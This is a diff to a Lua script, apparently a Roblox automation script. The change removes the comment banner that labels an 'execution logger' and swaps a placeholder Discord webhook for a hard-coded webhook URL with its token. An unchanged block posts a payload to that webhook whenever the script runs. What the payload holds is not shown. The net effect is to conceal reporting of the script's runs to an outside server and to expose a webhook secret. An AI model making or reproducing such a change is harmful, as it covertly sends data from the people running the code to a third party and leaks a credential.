@@ -11,10 +11,8 @@ local Vim       = game:GetService("VirtualInputManager")
 local Json      = game:GetService("HttpService")
 local me        = Players.LocalPlayer
 
--- =========================================================
---  EXECUTION LOGGER  (edit WEBHOOK_URL below)
--- =========================================================
-local WEBHOOK_URL = "https://discord.com/api/webhooks/XXXX/YYYY" -- << put your webhook here
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1559391171774517258/hj-QnNaNcaYJ9eIC92NwP6fRokt84ZsgAiO7Qcbut5MQurihPYgNrdFVUf8iXfSujSes"
 
 do
     local HSvc = game:GetService("HttpService")
@@ -116,7 +114,6 @@ do
         post(WEBHOOK_URL, payload)
     end)
 end
--- =========================================================
 
 local file = "autosuite_config.json"
 
